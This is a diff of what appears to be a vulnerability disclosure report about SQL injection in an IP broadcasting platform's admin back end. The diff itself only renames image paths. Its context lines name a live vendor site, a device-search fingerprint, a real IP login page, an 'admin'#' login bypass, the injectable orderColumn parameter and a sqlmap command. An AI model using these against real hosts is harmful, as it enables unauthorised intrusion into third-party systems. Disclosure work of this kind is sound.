@@ -6,7 +6,7 @@ There is sql injection in the background of ITC-ip service broadcasting platform
 
 Certificate of Company assets
 
-![](.\tup\wps1.jpg)
+![](.\picture\wps1.jpg)
 
 https://pa.itc-pa.cn/
 
@@ -20,7 +20,7 @@ injection parameter:orderColumn
 
 Space mapping： icon_hash="-568806419"
 
-![](.\tup\wps2.jpg) 
+![](.\picture\wps2.jpg) 
 
 Note: The vulnerability needs to log in to the background to obtain valid credentials to be carried out, you can use the front desk universal password    -admin‘#  Password-free access
 
@@ -34,7 +34,7 @@ http://60.170.49.111:81/login
 
 use     admin’#/123456   Login successfully
 
-![](.\tup\wps3.jpg) 
+![](.\picture\wps3.jpg) 
 
 Call the following interface for sql injection, the cookie is time-sensitive, please review and replace it by yourself
 
@@ -66,7 +66,7 @@ Connection: close
 
 ***\*python sqlmap.py -r ../url.txt --batch\**** 
 
-![](.\tup\wps4.jpg) 
+![](.\picture\wps4.jpg) 
 
 Instance II
 
@@ -74,7 +74,7 @@ Instance II
 
 use admin'# / 123456 Login successfully
 
-![](.\tup\wps5.jpg) 
+![](.\picture\wps5.jpg) 
 
 Call the following interface for sql injection, the cookie is time-sensitive, please review and replace it by yourself
 
@@ -108,7 +108,7 @@ Call the following interface for sql injection, the cookie is time-sensitive, pl
 
 ***\*python sqlmap.py -r ../url.txt --batch\**** 
 
-![](.\tup\wps6.jpg) 
+![](.\picture\wps6.jpg) 
 
 ***Instance Ⅲ***
 
@@ -116,7 +116,7 @@ Call the following interface for sql injection, the cookie is time-sensitive, pl
 
 *use admin'# / 123456 Login successfully*
 
-![](.\tup\wps7.jpg) 
+![](.\picture\wps7.jpg) 
 
 Call the following interface for sql injection, the cookie is time-sensitive, please review and replace it by yourself
 
@@ -146,7 +146,7 @@ Connection: close
 
 ***\*python sqlmap.py -r ../url.txt --batch\****
 
-![](.\tup\wps8.jpg) 
+![](.\picture\wps8.jpg) 
 
  
 
